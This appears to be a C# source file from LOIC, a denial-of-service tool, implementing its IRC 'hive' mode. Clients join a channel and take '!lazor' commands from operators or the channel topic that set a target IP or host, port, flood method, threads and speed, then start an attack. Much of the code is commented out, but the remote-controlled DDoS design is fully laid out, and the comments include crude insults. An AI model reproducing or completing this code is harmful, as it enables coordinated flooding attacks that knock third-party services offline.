namespace LOIC
{
	#region using directives
	using System;
	using System.Collections.Generic;
	using System.Threading;
	using Meebey.SmartIrc4net;
	#endregion

	public enum HiveState
	{
		Disconnected = 0x0,
		Connected = 0x1
	};
	
	public class HiveManager
	{
		#region Fields
		private int port;
		private string hostName;
		private string channel;
		
		private IrcClient irc;
		private Thread irclisten;
		private Dictionary<string, string> OpList;
		#endregion

		#region Constructor
		public HiveManager (string hostName, int port, string channel)
		{
			// Input validation
			if (port == default(int))
			{
				port = 6667;
			}
			
			if (string.IsNullOrEmpty (channel))
			{
				channel = "#LOIC";
			}
			else if (channel.StartsWith ("#"))
			{
				throw new ArgumentException("Channel name must start with #");
			}
			
			
			irc = new IrcClient ();
			/*
			irc.OnConnected += IrcConnected;
			irc.OnReadLine += OnReadLine;
			irc.OnChannelMessage += OnMessage;
			irc.OnOp += OnOp;
			irc.OnDeop += OnDeOp;
			irc.OnPart += OnPart;
			irc.OnNickChange += OnNickChange;
			irc.OnTopic += OnTopic;
			irc.OnTopicChange += OnTopicChange;
			irc.OnQuit += OnQuit;
			irc.OnKick += OnKick;
			irc.OnDisconnected += IrcDisconnected;
			irc.OnNames += OnNames;
			*/
			irc.AutoRejoinOnKick = true;
			irc.AutoRejoin = true;
			
			this.port = port;
			this.hostName = hostName;
			this.channel = channel;
			
			Connect ();
		}
		#endregion

		#region Properties
		public HiveState State { get; private set; }
		#endregion

		#region Methods
		public void Connect ()
		{
			/*
			try {
				irc.Connect (hostName, port);
				irc.Login ("LOIC_" + new Functions ().RandomString (), "We are LOIC", 0, "IRCLOIC");
				
				irclisten = new Thread (new ThreadStart (IrcListenThread));
				irclisten.Start ();
			} catch {
			}*/
		}
		
		public void Disconnect ()
		{	
			/*
			try {
				if (irclisten != null) {
					irclisten.Abort ();
				}
				
				if (irc != null) {
					irc.Disconnect ();
				}
			} catch {
			}
			*/
		}
		/*
		private void IrcListenThread ()
		{
			irc.Listen ();
		}

		private void IrcDisconnected (object o, EventArgs e)
		{
			Connect ();
		}

		private void IrcConnected (object o, EventArgs e)
		{
			label25.Text = "Logging In...";
		}

		private delegate void AddListBoxItemDelegate (object sender, ReadLineEventArgs e);
		void OnNames (object sender, NamesEventArgs e)
		{
			SetStatus ("Connected!");
			if (OpList != null) {
				OpList.Clear ();
			} else {
				if (OpList == null)
					OpList = new Dictionary<string, string> ();
			}
			
			foreach (string user in e.UserList) {
				if (user.StartsWith ("@") || user.StartsWith ("&") || user.StartsWith ("~")) {
					
					OpList.Add (user.Substring (1), "");
				}
			}
		}

		void OnOp (object sender, OpEventArgs e)
		{
			if (OpList == null)
				OpList = new Dictionary<string, string> ();
			if (!OpList.ContainsKey (e.Whom)) {
				OpList.Add (e.Whom, "");
			}
		}

		void OnDeOp (object sender, DeopEventArgs e)
		{
			if (OpList == null)
				OpList = new Dictionary<string, string> ();
			if (OpList.ContainsKey (e.Whom)) {
				OpList.Remove (e.Whom);
			}
		}

		void OnPart (object sender, PartEventArgs e)
		{
			if (OpList == null)
				OpList = new Dictionary<string, string> ();
			if (OpList.ContainsKey (e.Who)) {
				OpList.Remove (e.Who);
			}
		}

		void OnQuit (object sender, QuitEventArgs e)
		{
			if (OpList == null)
				OpList = new Dictionary<string, string> ();
			if (OpList.ContainsKey (e.Who)) {
				OpList.Remove (e.Who);
			}
		}

		void OnTopic (object sender, TopicEventArgs e)
		{
			if (e.Channel == channel && e.Topic.StartsWith ("!lazor")) {
				List<string> pars = new List<string> (e.Topic.Split (' '));
				SetStatus ("Controlled by topic");
				try {
					txtTargetIP.Invoke (new CheckParamsDelegate (CheckParams), pars);
				} catch {
				}
			}
		}

		void OnTopicChange (object sender, TopicChangeEventArgs e)
		{
			if (e.Channel == channel && e.NewTopic.StartsWith ("!lazor")) {
				List<string> pars = new List<string> (e.NewTopic.Split (' '));
				SetStatus ("Controlled by topic");
				try {
					txtTargetIP.Invoke (new CheckParamsDelegate (CheckParams), pars);
				} catch {
				}
			}
		}

		void OnNickChange (object sender, NickChangeEventArgs e)
		{
			if (OpList.ContainsKey (e.OldNickname)) {
				OpList.Remove (e.OldNickname);
			}
			if (!OpList.ContainsKey (e.NewNickname)) {
				OpList.Add (e.NewNickname, "");
			}
		}

		void OnKick (object sender, KickEventArgs e)
		{
			if (OpList == null)
				OpList = new Dictionary<string, string> ();
			if (OpList.ContainsKey (e.Whom)) {
				OpList.Remove (e.Whom);
			}
		}

		private delegate void SetStatusDelegate (string status);
		void SetStatus (string status)
		{
			if (label25.InvokeRequired) {
				label25.Invoke (new SetStatusDelegate (SetStatus), status);
			} else {
				label25.Text = status;
			}
		}

		void OnMessage (object sender, IrcEventArgs e)
		{
			if (e.Data.Channel == channel) {
				if (e.Data.Message.StartsWith ("!lazor ")) {
					//authenticate
					if (OpList != null && OpList.ContainsKey (e.Data.Nick)) {
						List<string> pars = new List<string> (e.Data.Message.Split (' '));
						SetStatus ("Controlled by " + e.Data.Nick);
						try {
							txtTargetIP.Invoke (new CheckParamsDelegate (CheckParams), pars);
						} catch {
						}
					} else {
						//disregard, he sucks cocks
						//irc.RfcPrivmsg(e.Data.Channel, "I'm gonna disregard that, you suck cocks");
					}
				}
			}
		}

		void CheckParams (List<string> pars)
		{
			Attack (false, false, true);
			
			foreach (string param in pars) {
				string[] sp = param.Split ('=');
				if (sp.Length > 1) {
					string cmd = sp[0];
					string value = sp[1];
					int num;
					bool isnum;
					switch (cmd.ToLower ()) {
					case "targetip":
						txtTargetIP.Text = value;
						LockOnIP (true);
						break;
					
					case "targethost":
						txtTargetURL.Text = value;
						LockOnURL (true);
						break;
					
					case "timeout":
						isnum = int.TryParse (value, out num);
						if (isnum) {
							txtTimeout.Text = num.ToString ();
						}
						
						break;
					
					case "subsite":
						txtSubsite.Text = value;
						break;
					
					case "message":
						txtData.Text = value;
						break;
					
					case "port":
						txtPort.Text = value;
						break;
					
					case "method":
						int index = cbMethod.FindString (value);
						if (index != -1) {
							cbMethod.SelectedIndex = index;
						}
						
						break;
					
					case "threads":
						isnum = int.TryParse (value, out num);
						//let's protect them a bit, yeah?
						if (isnum && num < 100) {
							txtThreads.Text = num.ToString ();
						}
						
						break;
					
					case "wait":
						if (value.ToLower () == "true") {
							chkResp.Checked = true;
						} else if (value.ToLower () == "false") {
							chkResp.Checked = false;
						}
						
						break;
					
					case "random":
						if (value.ToLower () == "true") {
							chkRandom.Checked = true;
							//HTTP
							chkMsgRandom.Checked = true;
							//TCP_UDP
						} else if (value.ToLower () == "false") {
							chkRandom.Checked = false;
							//HTTP
							chkMsgRandom.Checked = false;
							//TCP_UDP
						}
						
						break;
					
					case "speed":
						isnum = int.TryParse (value, out num);
						//let's protect them a bit, yeah?
						if (isnum && num >= 0 && num <= 20) {
							tbSpeed.Value = num;
						}
						
						break;
					}
				} else {
					if (sp[0].ToLower () == "start") {
						Attack (false, true, true);
						return;
					} else if (sp[0].ToLower () == "default") {
						txtTargetIP.Text = "";
						txtTargetURL.Text = "";
						txtTimeout.Text = "9001";
						txtSubsite.Text = "/";
						txtData.Text = "U dun goofed";
						txtPort.Text = "80";
						int index = cbMethod.FindString ("TCP");
						if (index != -1) {
							cbMethod.SelectedIndex = index;
						}
						txtThreads.Text = "10";
						chkResp.Checked = true;
						chkRandom.Checked = false;
						chkMsgRandom.Checked = false;
						tbSpeed.Value = 0;
					}
				}
			}
			SetStatus ("Waiting.");
		}

		void OnReadLine (object sender, ReadLineEventArgs e)
		{
			string command = e.Line.Split (' ')[1];
			if (command == "PING") {
				string server = e.Line.Split (' ')[2];
				irc.WriteLine ("PONG " + server, Priority.Critical);
				//end of motd
			} else if (command == "376") {
				if (OpList != null)
					OpList.Clear ();
				irc.RfcJoin (channel);
			}
		}
		*/
		#endregion
	}
}